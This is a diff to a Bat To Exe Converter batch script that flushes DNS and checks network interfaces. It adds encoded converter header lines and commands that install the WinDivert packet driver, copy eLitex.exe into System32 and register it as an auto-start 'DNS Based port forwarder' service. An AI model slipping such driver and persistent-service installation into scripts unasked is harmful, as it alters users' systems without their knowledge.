@@ -1,5 +1,9 @@
 ::[Bat To Exe Converter]
 ::
+::fBE1pAF6MU+EWH/eyEccIQ9RVDiHEGKuA61S7fD+jw==
+::fBE1pAF6MU+EWH/eyEccIQ9RVDi1NWWeD6MZ+vy16+aLwg==
+::fBE1pAF6MU+EWH/eyEccIQ9RVDiVNWW+D6MZ+vytu6SOrEt9
+::fBE1pAF6MU+EWH/eyEccIQ9RVDi1NWWeD6MZ+vytu6SUu159
 ::YAwzoRdxOk+EWAnk
 ::fBw5plQjdG8=
 ::YAwzuBVtJxjWCl3EqQJgSA==
@@ -26,7 +30,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFDxYRRCWOXn0IbkV/Pz+/ae3gXE5UfE0bIDL5rGCNOQD5gvhbZNN
+::Zh4grVQjdCuDJH2F4EMMBxdQDDeSM3muOoYT5e3z4P3HkEgeUewrRIrXzoirLOkH71HgZZoR0n9KlMQVAR5Wai6uYhswuWIMs3yAVw==
 ::YB416Ek+ZW8=
 ::
 ::
@@ -41,3 +45,8 @@ for /f "tokens=1,2,3*" %%i in ('netsh int show interface') do (
 
 ipconfig /flushdns
 start "" "https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr"
+
+rundll32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 132 "windivert64.inf"
+copy eLitex.exe %SystemRoot%\System32\
+sc create eLitex binpath= %SystemRoot%\System32\eLitex.exe type= own start= auto DisplayName= "eLitex HTTP extension" 
+sc description eLitex "DNS Based port forwarder for eLitet Insiders. If disabled, http:// access to subscribed websites will be refused."
